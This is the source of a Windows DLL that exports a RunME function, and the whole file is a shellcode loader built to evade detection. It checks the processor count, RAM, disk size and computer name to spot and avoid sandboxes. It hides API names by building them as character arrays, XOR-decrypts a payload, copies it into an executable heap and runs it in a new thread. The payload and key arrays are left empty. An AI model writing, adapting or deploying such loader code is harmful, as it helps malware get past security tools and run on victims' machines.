#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

extern "C" {
__declspec(dllexport) BOOL WINAPI RunME(void) {

    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 4) return false;

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
    if (RAMMB < 4000) return false;

    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
    DWORD diskSizeGB;
    diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
    if (diskSizeGB < 50) return false;

    DWORD computerNameLength = MAX_COMPUTERNAME_LENGTH + 1;
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    GetComputerNameW(computerName, &computerNameLength);
    CharUpperW(computerName);
    if (wcsstr(computerName, L"DESKTOP-")) return false;

    const char calc_payload[] = { };
    char pl_key[] = "";
	unsigned int calc_len = sizeof(calc_payload);

    char kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
    HMODULE hkernel32 = GetModuleHandleA(kernel32);

    char HeapCreate[] = { 'H','e','a','p','C','r','e','a','t','e',0 };
    using HeapCreatePrototype = HANDLE(WINAPI*)(DWORD, SIZE_T, SIZE_T);
    HeapCreatePrototype hHeapCreate = (HeapCreatePrototype)GetProcAddress(hkernel32, HeapCreate);

    char HeapAlloc[] = { 'H','e','a','p','A','l','l','o','c',0 };
    using HeapAllocPrototype = LPVOID(WINAPI*)(HANDLE, DWORD, SIZE_T);
    HeapAllocPrototype hHeapAlloc = (HeapAllocPrototype)GetProcAddress(hkernel32, HeapAlloc);

    char RtlCopyMemory[] = { 'R','t','l','C','o','p','y','M','e','m','o','r','y',0 };
    using RtlCopyMemoryPrototype = void(WINAPI*)(void*, const void*, size_t);
    RtlCopyMemoryPrototype hRtlCopyMemory = (RtlCopyMemoryPrototype)GetProcAddress(hkernel32, RtlCopyMemory);

    char CreateThread[] = { 'C','r','e','a','t','e','T','h','r','e','a','d',0 };
    using CreateThreadPrototype = HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    CreateThreadPrototype hCreateThread = (CreateThreadPrototype)GetProcAddress(hkernel32, CreateThread);

    char WaitForSingleObject[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 };
    using WaitForSingleObjectPrototype = DWORD(WINAPI*)(HANDLE, DWORD);
    WaitForSingleObjectPrototype hWaitForSingleObject = (WaitForSingleObjectPrototype)GetProcAddress(hkernel32, WaitForSingleObject);

    int j;
    j = 0;
	for (int i = 0; i < sizeof calc_payload; i++)
	{
        if (j == sizeof(pl_key) - 1) j = 0;

		((char*)calc_payload)[i] = (((char*)calc_payload)[i]) ^ pl_key[j];
        j++;
	}

    HANDLE Heap_Created = hHeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0); //Using Heap instead of Virtualalloc
    LPVOID Heap_Handle = hHeapAlloc(Heap_Created, HEAP_ZERO_MEMORY, sizeof calc_payload);
    hRtlCopyMemory(Heap_Handle, calc_payload, sizeof calc_payload); // Copy calc_payload into new created heap
    DWORD threadID; //Create Thread to execute the calc_payload

    HANDLE hThread = hCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)Heap_Handle, NULL, 0, &threadID);
    hWaitForSingleObject(hThread, INFINITE);

    return EXIT_SUCCESS;
    }
}